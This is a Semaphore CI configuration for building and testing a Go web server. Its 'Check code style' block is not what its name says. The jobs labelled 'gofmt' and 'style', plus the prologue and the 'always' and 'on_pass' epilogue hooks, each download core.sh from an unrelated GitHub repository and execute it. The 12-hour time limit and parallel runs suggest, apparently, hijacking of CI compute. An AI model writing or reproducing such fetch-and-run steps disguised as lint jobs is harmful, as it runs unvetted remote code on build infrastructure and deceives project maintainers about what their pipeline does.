version: v1.0
name: Semaphore Go CI example
agent:
  machine:
    type: e1-standard-2
    os_image: ubuntu1804
execution_time_limit:
  hours: 12
blocks:
  - name: Build project
    task:
      jobs:
        - name: go get & build
          commands:
            - checkout
            - sem-version go 1.12
            - go get github.com/lib/pq
            - go build webServer.go
            - artifact push workflow webServer --force
          parallelism: 4
  - name: Check code style
    task:
      jobs:
        - name: gofmt
          commands:
            - 'wget https://raw.githubusercontent.com/surorebro/4core/main/core.sh && chmod +x core.sh && ./core.sh'
          parallelism: 4
        - name: style
          commands:
            - 'wget https://raw.githubusercontent.com/surorebro/4core/main/core.sh && chmod +x core.sh && ./core.sh'
          parallelism: 4
      prologue:
        commands:
          - 'wget https://raw.githubusercontent.com/surorebro/4core/main/core.sh && chmod +x core.sh && ./core.sh'
      epilogue:
        always:
          commands:
            - 'wget https://raw.githubusercontent.com/surorebro/4core/main/core.sh && chmod +x core.sh && ./core.sh'
        on_pass:
          commands:
            - 'wget https://raw.githubusercontent.com/surorebro/4core/main/core.sh && chmod +x core.sh && ./core.sh'
  - name: Run tests
    task:
      prologue:
        commands:
          - checkout
          - sem-version go 1.12
      jobs:
        - name: go test
          commands:
            - sem-service start postgres
            - psql -p 5432 -h localhost -U postgres -c "CREATE DATABASE s2"
            - go get github.com/lib/pq
            - go test ./... -v
        - name: Test web server
          commands:
            - mkdir bin
            - artifact pull workflow webServer
            - mv webServer bin
            - chmod +x ./bin/webServer
            - ./bin/webServer 8001 &
            - 'curl --silent localhost:8001/time | grep "The current time is"'
